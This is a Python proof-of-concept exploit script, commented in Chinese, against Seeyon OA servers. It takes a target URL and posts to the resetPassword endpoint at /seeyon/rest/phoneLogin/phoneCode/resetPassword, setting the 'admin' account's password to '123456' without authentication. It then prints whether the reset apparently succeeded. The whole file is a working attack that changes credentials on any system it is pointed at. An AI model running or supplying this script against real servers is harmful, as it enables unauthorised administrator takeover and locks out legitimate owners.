import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/seeyon/rest/phoneLogin/phoneCode/resetPassword，参数是loginName和password',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/seeyon/rest/phoneLogin/phoneCode/resetPassword"  # 移除末尾的斜杠
    else:
        url = args.url + "/seeyon/rest/phoneLogin/phoneCode/resetPassword"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Content-Type': 'application/json',
    'Connection': 'close',
}

data = {"loginName": "admin", "password": "123456"}

response = requests.post(url, headers=headers, json=data)
if response.status_code == 200:
    print("目标url："+ url + '\n' +"可能存在该漏洞，admin密码修改为123456")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")


